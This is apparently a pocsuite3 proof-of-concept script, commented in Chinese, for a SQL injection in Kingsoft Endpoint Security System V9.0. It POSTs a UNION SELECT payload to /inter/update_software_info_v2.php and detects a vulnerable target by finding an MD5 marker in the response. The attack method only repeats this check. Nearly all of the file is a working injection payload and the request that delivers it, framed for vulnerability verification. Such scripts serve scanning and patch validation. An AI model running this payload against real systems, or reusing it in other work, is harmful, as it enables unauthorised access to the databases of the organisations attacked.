from collections import OrderedDict
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '20231018'  #漏洞公开的时间,不知道就写今天
    createDate = '20231018'  # 编写 PoC 的日期
    updateDate = '20231018'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '金山终端安全系统V9.0 SQL注入'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '金山终端安全系统V9.0'  # 漏洞应用名称
    appVersion = '''<V9.SP1.E1008'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        近期，长亭科技监测到猎鹰安全（原金山安全）官方发布了新版本修复了一处SQL注入漏洞。
        该漏洞是由于金山终端安全系统未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。
        官方已经推出了新版本修复了漏洞。建议所有受影响的用户尽快访问官方网站，更新版本至新版本。
        https://www.ejinshan.net/lywz/index
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path = "/inter/update_software_info_v2.php"
        url = self.url + path
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                'Content-Type':'application/x-www-form-urlencoded'
        }
        data = "type=-100+UNION+SELECT+1,md5(078674232),1,1,1,1,1,1--&key=&pageCount=0&curPage="
        try:
            resp = requests.post(url=url, headers=headers, data=data,verify=False, timeout=10)
            if '681f231be412282f9e8681ee1d9472e5' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['message'] = self.url
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)